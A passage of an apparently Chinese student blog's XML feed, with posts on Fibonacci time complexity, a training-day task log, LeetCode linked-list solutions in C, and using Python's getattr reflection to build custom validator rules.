将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 考研 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>斐波拉契数列时间复杂度分析</title>
      <link href="/2021/06/30/fei-bo-la-qi-shu-lie-shi-jian-fu-za-du-fen-xi/"/>
      <url>/2021/06/30/fei-bo-la-qi-shu-lie-shi-jian-fu-za-du-fen-xi/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#%E6%96%90%E6%B3%A2%E6%8B%89%E5%A5%91%E6%95%B0%E5%88%97%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90">斐波拉契数列时间复杂度分析</a><ul><li><a href="#%E9%80%92%E5%BD%92%E7%89%88">递归版</a><ul><li><a href="#%E8%AF%81%E6%98%8E1">证明1</a></li><li><a href="#%E8%AF%81%E6%98%8E2">证明2</a></li></ul></li></ul></li></ul><h1 id="斐波拉契数列时间复杂度分析"><a href="#斐波拉契数列时间复杂度分析" class="headerlink" title="斐波拉契数列时间复杂度分析"></a>斐波拉契数列时间复杂度分析</h1><h2 id="递归版"><a href="#递归版" class="headerlink" title="递归版"></a>递归版</h2><p>递归版本的时间复杂度分析，真的不知道怎么分析，需要根据<code>f(n) = f(n-1) + f(n-2)</code>推出通解。这显然是个数学问题。<br>不知道为什么他们会给出这结果，难道不管通项公式的后一项了？</p><p>通项公式如下:<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210630173631.png" alt="20210630173631"></p><h3 id="证明1"><a href="#证明1" class="headerlink" title="证明1"></a>证明1</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210630173802.png" alt="20210630173802"></p><h3 id="证明2"><a href="#证明2" class="headerlink" title="证明2"></a>证明2</h3><p>还是看不太懂，为什么要给加法加个1呢？<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210630174145.png" alt="20210630174145"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 考研 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训day11</title>
      <link href="/2021/06/23/shi-xun-day11/"/>
      <url>/2021/06/23/shi-xun-day11/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#test">Test</a></li><li><a href="#%E4%BD%9C%E4%B8%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0">作业功能实现</a><ul><li><a href="#%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E6%80%9D%E8%B7%AF">修改代码思路</a></li><li><a href="#%E9%97%AE%E9%A2%98">问题</a></li></ul></li></ul><h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><p>关于git 中rebase和merge的区别<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210621145651.png" alt="20210621145651"></p><h1 id="作业功能实现"><a href="#作业功能实现" class="headerlink" title="作业功能实现"></a>作业功能实现</h1><ul><li><input checked="" disabled="" type="checkbox"> 增加时间搜索</li><li><input checked="" disabled="" type="checkbox"> 增加时间更新修改</li><li><input checked="" disabled="" type="checkbox"> 增加个人页面 并且展示当前登录用户的名称和此用户的个人信息，增加修改</li><li><input disabled="" type="checkbox"> (扩展)用户可以自定义上传头像更新 实现退出效果</li></ul><h2 id="修改代码思路"><a href="#修改代码思路" class="headerlink" title="修改代码思路"></a>修改代码思路</h2><ul><li><input disabled="" type="checkbox"> 更改前端代码，增加相应的板块</li><li><input disabled="" type="checkbox"> Mapper 添加相应的查询</li><li><input disabled="" type="checkbox"> Controller接口</li></ul><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul><li><p><input checked="" disabled="" type="checkbox">  用户更新里面的时间输入框无法渲染,就像是个普通的input, —-是不是跟js代码的渲染顺序有关系？？？？</p><pre><code>在回调函数里面继续写js代码就行啦</code></pre></li><li><p><input checked="" disabled="" type="checkbox">  在用户个人页面把详细的信息以pojo对应的方式传进去</p></li><li><p><input checked="" disabled="" type="checkbox">  修改了代码后记得重新打包哦！！！  否则上传到服务器的包还是之前的jar包，就会恼火很长时间。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 国信安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode7/8-找链表交点/合并有序链表</title>
      <link href="/2021/06/15/leetcode78-zhao-lian-biao-jiao-dian-he-bing-you-xu-lian-biao/"/>
      <url>/2021/06/15/leetcode78-zhao-lian-biao-jiao-dian-he-bing-you-xu-lian-biao/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#leetcode7-%E6%89%BE%E9%93%BE%E8%A1%A8%E4%BA%A4%E7%82%B9">leetcode7-找链表交点</a><ul><li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0">题目描述</a></li><li><a href="#%E6%80%9D%E8%B7%AF">思路</a><ul><li><a href="#%E4%BB%A3%E7%A0%81">代码</a></li><li><a href="#%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90">复杂度分析</a></li></ul></li></ul></li><li><a href="#leetcode8-%E5%90%88%E5%B9%B6%E6%9C%89%E5%BA%8F%E9%93%BE%E8%A1%A8">leetcode8-合并有序链表</a><ul><li><a href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1">题目描述</a></li><li><a href="#%E6%80%9D%E8%B7%AF-1">思路</a><ul><li><a href="#%E4%BB%A3%E7%A0%81-1">代码</a></li><li><a href="#%E5%A4%8D%E6%9D%82%E5%BA%A6%E5%88%86%E6%9E%90-1">复杂度分析</a></li></ul></li></ul></li></ul><h1 id="leetcode7-找链表交点"><a href="#leetcode7-找链表交点" class="headerlink" title="leetcode7-找链表交点"></a>leetcode7-找链表交点</h1><p>这个题目又没有好好审题，我以为的交点可以是这样的</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210615113259.png" alt="20210615113259"></p><p>没想到交点以后的所有节点应该都是重合的！</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210615113350.png" alt="20210615113350"></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>如果有相交的结点D的话,每条链的头结点先走完自己的链表长度,然后回头走另外的一条链表,那么两结点一定为相交于D点,因为这时每个头结点走的距离是一样的,都是 AD + BD + DC,而他们每次又都是前进1,所以距离相同,速度又相同,固然一定会在相同的时间走到相同的结点上,即D点。</p><ul><li><p>如果不相交 ： 如果不相交的话 假设两个链表长度不相等 一个为A 一个为B ，指针第一次走完A会去走B,另一个走完B再去走A，两个指针走的路程都是A+B。会同时为NULL 跳出循环</p></li><li><p>如果不相交且链表长度相等: 那么一个指针走A,一个指针走B，它俩同时走到NULL，相等，跳出循环</p></li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode *getIntersectionNode(struct ListNode *headA, struct ListNode *headB) &#123;    struct ListNode* A, * B;    A &#x3D; headA;    B &#x3D; headB;    while(A!&#x3D;B)&#123;        A &#x3D; A &#x3D;&#x3D; NULL ? headB : A-&gt;next;        B &#x3D; B &#x3D;&#x3D; NULL ? headA : B-&gt;next;    &#125;    return A;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度 <code>O(N)</code> 最差依次访问一遍 <code>A+B</code> 中的所有节点 <br><br>空间复杂度 <code>O(1)</code> 就用两个指针</p><h1 id="leetcode8-合并有序链表"><a href="#leetcode8-合并有序链表" class="headerlink" title="leetcode8-合并有序链表"></a>leetcode8-合并有序链表</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">输入两个递增排序的链表，合并这两个链表并使新链表中的节点仍然是递增排序的。示例1：输入：1-&gt;2-&gt;4, 1-&gt;3-&gt;4输出：1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4来源：力扣（LeetCode）链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;he-bing-liang-ge-pai-xu-de-lian-biao-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>leetcode的题解</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210615164632.png" alt="20210615164632"></p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode* mergeTwoLists(struct ListNode* l1, struct ListNode* l2)&#123;    struct ListNode* a, *b,*c,*d;    a &#x3D; l1;    b &#x3D; l2;    d &#x3D; c &#x3D; (struct ListNode*)malloc(sizeof(struct ListNode));    while(a&amp;&amp;b)&#123;        if(a-&gt;val &lt; b-&gt;val) &#123;            c-&gt;next &#x3D; a;            a &#x3D; a-&gt;next;            c &#x3D; c-&gt;next;        &#125;        else if(a-&gt;val&gt;&#x3D;b-&gt;val)&#123;            c-&gt;next &#x3D; b;            b &#x3D; b-&gt;next;            c &#x3D; c-&gt;next;        &#125;    &#125;    if(a &#x3D;&#x3D; NULL) c-&gt;next &#x3D; b;    else c-&gt;next &#x3D; a;    return d-&gt;next;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度 <code>O(M+N)</code> M为l1链表的长度 N为l2链表的长度 <br><br>空间复杂度 O(1)</p>]]></content>
      
      
      <categories>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode5-反向输出链表</title>
      <link href="/2021/06/14/leetcode5-fan-xiang-shu-chu-lian-biao/"/>
      <url>/2021/06/14/leetcode5-fan-xiang-shu-chu-lian-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="反向输出链表"><a href="#反向输出链表" class="headerlink" title="反向输出链表"></a>反向输出链表</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class="line-numbers language-none"><code class="language-none">输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。 示例 1：输入：head &#x3D; [1,3,2]输出：[2,3,1] 限制：0 &lt;&#x3D; 链表长度 &lt;&#x3D; 10000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>第一遍遍历找到一共的个数</li><li>malloc</li><li>倒序赋值</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;反序打印链表int* reversePrint(struct ListNode* head, int* returnSize) &#123;    &#x2F;&#x2F;第一遍遍历获取数目    int num &#x3D; 0;    struct ListNode* temp &#x3D; head;    while (temp)    &#123;        num++;        temp &#x3D; temp-&gt;next;    &#125;    int* ret &#x3D; (int*)malloc(num * sizeof(int));    memset(ret, -1, num * sizeof(int));        temp &#x3D; head;    int i &#x3D; 1;    while (temp)    &#123;        ret[num - i] &#x3D; temp-&gt;val;        i++;        temp &#x3D; temp-&gt;next;    &#125;    *returnSize &#x3D; num;    return ret;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度 O(n)<br>空间复杂度 O(n)</p><h2 id="优秀思路"><a href="#优秀思路" class="headerlink" title="优秀思路"></a>优秀思路</h2><p>差不多跟我一样</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int* reversePrint(struct ListNode* head, int* returnSize)&#123;    struct ListNode *p &#x3D; head;    int n &#x3D; 0;    while(p !&#x3D; NULL) &#123;        p &#x3D; p-&gt;next;        n++;    &#125;    int *arr &#x3D; (int *)malloc(sizeof(int) * n);    struct ListNode *q &#x3D; head;    *returnSize &#x3D; n;    for(int i &#x3D; n - 1; i &gt;&#x3D; 0; i--)&#123;        arr[i] &#x3D; q-&gt;val;        q &#x3D; q-&gt;next;    &#125;    return arr;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode6-判断链表中是否存在环</title>
      <link href="/2021/06/14/leetcode6-pan-duan-lian-biao-zhong-shi-fou-cun-zai-huan/"/>
      <url>/2021/06/14/leetcode6-pan-duan-lian-biao-zhong-shi-fou-cun-zai-huan/</url>
      
        <content type="html"><![CDATA[<h1 id="leetcode6-判断链表中是否存在环"><a href="#leetcode6-判断链表中是否存在环" class="headerlink" title="leetcode6-判断链表中是否存在环"></a>leetcode6-判断链表中是否存在环</h1><p>这道题感觉很难嗷！ 但是确实是属于简单题的行列( 我是fw )，全程都在看解析。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="快慢指针"><a href="#快慢指针" class="headerlink" title="快慢指针"></a>快慢指针</h3><p>本方法需要读者对「Floyd 判圈算法」（又称龟兔赛跑算法）有所了解。</p><p>假想「乌龟」和「兔子」在链表上移动，「兔子」跑得快，「乌龟」跑得慢。当「乌龟」和「兔子」从链表上的同一个节点开始移动时，如果该链表中没有环，那么「兔子」将一直处于「乌龟」的前方；如果该链表中有环，那么「兔子」会先于「乌龟」进入环，并且一直在环内移动。等到「乌龟」进入环时，由于「兔子」的速度快，它一定会在某个时刻与乌龟相遇，即套了「乌龟」若干圈。</p><p>作者：LeetCode-Solution<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-cycle/solution/huan-xing-lian-biao-by-leetcode-solution/">https://leetcode-cn.com/problems/linked-list-cycle/solution/huan-xing-lian-biao-by-leetcode-solution/</a><br>来源：力扣（LeetCode）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">bool <span class="token function">hasCycle</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ListNode</span><span class="token operator">*</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">struct</span> <span class="token class-name">ListNode</span><span class="token operator">*</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">ListNode</span><span class="token operator">*</span> fast <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>slow <span class="token operator">!=</span> fast<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fast <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> fast<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> false<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        slow <span class="token operator">=</span> slow<span class="token operator">-></span>next<span class="token punctuation">;</span>        fast <span class="token operator">=</span> fast<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li><p>时间复杂度：<code>O(N)</code>，其中 N 是链表中的节点数。</p><ul><li><p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p></li><li><p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 N 轮。</p></li></ul></li><li><p>空间复杂度：<code>O(1)</code> 我们只使用了两个指针的额外空间。</p></li></ul><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><p>用哈希表来存储所有已经访问过的节点。每次我们到达一个节点，如果该节点已经存在于哈希表中，则说明该链表是环形链表，否则就将该节点加入哈希表中。重复这一过程，直到我们遍历完整个链表即可。</p><p>重要的是哈希表的原理<br>知乎的文章： 具体还是你后面去看看相应的源码，会比较方便一些。</p><p><a href="https://zhuanlan.zhihu.com/p/144296454">https://zhuanlan.zhihu.com/p/144296454</a></p><h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><ul><li><p>时间复杂度：<code>O(N)</code>，其中 <code>N</code> 是链表中的节点数。最坏情况下我们需要遍历每个节点一次。</p></li><li><p>空间复杂度：<code>O(N)</code>，其中 <code>N</code> 是链表中的节点数。主要为哈希表的开销，最坏情况下我们需要将每个节点插入到哈希表中一次。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode4-删除链表节点</title>
      <link href="/2021/06/11/leetcode4-shan-chu-lian-biao-jie-dian/"/>
      <url>/2021/06/11/leetcode4-shan-chu-lian-biao-jie-dian/</url>
      
        <content type="html"><![CDATA[<h1 id="leecode4-删除链表节点"><a href="#leecode4-删除链表节点" class="headerlink" title="leecode4-删除链表节点"></a>leecode4-删除链表节点</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>说明：文章中的优秀思路均来自优秀题解的第一个，之所以截图是因为懒。。</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">给定单向链表的头指针和一个要删除的节点的值，定义一个函数删除该节点。返回删除后的链表的头节点。注意：此题对比原题有改动示例 1:输入: head &#x3D; [4,5,1,9], val &#x3D; 5输出: [4,1,9]解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 1 -&gt; 9.示例 2:输入: head &#x3D; [4,5,1,9], val &#x3D; 1输出: [4,5,9]解释: 给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -&gt; 5 -&gt; 9.来源：力扣（LeetCode）链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;shan-chu-lian-biao-de-jie-dian-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这里借鉴了前面看到优秀思路中的<strong>虚拟节点 virtualNode</strong> ,即在头节点head前再增加一个虚拟节点，可以避免讨论 <strong>tag</strong> 节点是否是头节点的情况。最后统一返回 <strong>virtualNode-&gt;next</strong></p><ul><li>遍历链表找到值相等的节点</li><li>保留节点的前驱节点 <strong>prev</strong></li><li>前驱节点 <strong>prev</strong> 指向删除节点 <strong>tag</strong> 的下一节点</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct ListNode* deleteNode(struct ListNode* head, int val) &#123;    struct ListNode* tag &#x3D; head, * prev&#x3D;NULL;    struct ListNode* virtualNode &#x3D; (ListNode*)malloc(sizeof(ListNode));    virtualNode-&gt;next &#x3D; head;    virtualNode-&gt;val &#x3D; -1;    prev &#x3D; virtualNode;    while (tag-&gt;next)    &#123;        if (tag-&gt;val &#x3D;&#x3D; val) break;        prev &#x3D; tag;        tag &#x3D; tag-&gt;next;    &#125;    prev-&gt;next &#x3D; tag-&gt;next;    return virtualNode-&gt;next;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="优秀思路"><a href="#优秀思路" class="headerlink" title="优秀思路"></a>优秀思路</h2><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>如果理解递归很困难，可以采用一种叫做<strong>坚定信念</strong>的理解方式。即假设<strong>deleteNode返回的值就是对应节点的下一个节点</strong>，那下面这个java版的递归就不难理解了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210611093444.png" alt="20210611093444"></p>]]></content>
      
      
      <categories>
          
          <category> 链表 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py如何根据字符串来创建对应的类</title>
      <link href="/2021/06/11/py-ru-he-gen-ju-zi-fu-chuan-lai-chuang-jian-dui-ying-de-lei/"/>
      <url>/2021/06/11/py-ru-he-gen-ju-zi-fu-chuan-lai-chuang-jian-dui-ying-de-lei/</url>
      
        <content type="html"><![CDATA[<h1 id="py如何根据字符串来创建对应的类"><a href="#py如何根据字符串来创建对应的类" class="headerlink" title="py如何根据字符串来创建对应的类"></a>py如何根据字符串来创建对应的类</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>py的反射原理，简单来说，反射就是能实现动态地调用方法\实例化对象。</p><p>举个例子:<br></p><p>创建一个学生类Student的对象 person1、创建一个老师类Teacher的对象person1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">person1 <span class="token operator">=</span> Student<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token keyword">or</span>person1 <span class="token operator">=</span> Teacher<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试想一下，假如，你并不是先前(在写程序之前)就知道这个person1的身份到底是学生还是老师，那你该如何创建这个对象？</p><p>或者说你要 <strong>根据这个人的输入: 职业:老师,姓名:张三</strong> 来动态的创建对象。</p><p>这里就要用到py的反射</p><p>对应到web路由可能更容易理解。详细请看 <a href="https://www.liujiangblog.com/course/python/48">https://www.liujiangblog.com/course/python/48</a></p><h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>在本次实训的过程中，由于是基线检查，但是对于每个审查条目的规则(存储在数据库)是不一样的。</p><p>关键的是，所用的validator中预制的规则rule无法满足特定的需求。然后，除了使用他文档中的规则意外，我根据他自定义规则的写法，自定义如下三种规则</p><ul><li>AuditRule-判断前后集合是否一致</li><li>AuditRuleInclude-判断前面集合是否是后面集合的子集</li><li>AuditRuleSame-判断两个字符串是否相等。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">AuditRule</span><span class="token punctuation">(</span>Rule<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    TestCode:        rules = &#123;"age": AuditRule('test,test')&#125;        req = &#123;"age": 'test,test'&#125;        print(validate(req, rules,return_info=True))    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> string<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Rule<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>string <span class="token operator">=</span> string        self<span class="token punctuation">.</span>value <span class="token operator">=</span> string<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> arg<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> arg <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            arg <span class="token operator">=</span> <span class="token string">"Null"</span>            self<span class="token punctuation">.</span>set_error<span class="token punctuation">(</span><span class="token string">"excepted get |"</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>string <span class="token operator">+</span> <span class="token string">"| but get |"</span> <span class="token operator">+</span> arg<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        exit_value_list <span class="token operator">=</span> arg<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>        <span class="token comment"># 判断两个集合是否一样  前面是否是后面的子集</span>        self<span class="token punctuation">.</span>set_error<span class="token punctuation">(</span><span class="token string">"excepted get |"</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>string <span class="token operator">+</span> <span class="token string">"| but get |"</span> <span class="token operator">+</span> arg<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token builtin">set</span><span class="token punctuation">(</span>exit_value_list<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">set</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实，我所用的validator这个包，就已经利用了反射。因为他就是根据我输入的字符串，去动态地翻译和创建成对应的类。所以我也想实现根据数据库中存储的规则，来动态地创建。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210611161640.png" alt="20210611161640"></p><h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><h3 id="使用的函数"><a href="#使用的函数" class="headerlink" title="使用的函数"></a>使用的函数</h3><p>我就只用到了<strong>getattr</strong>函数。其对应的文档解释如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> 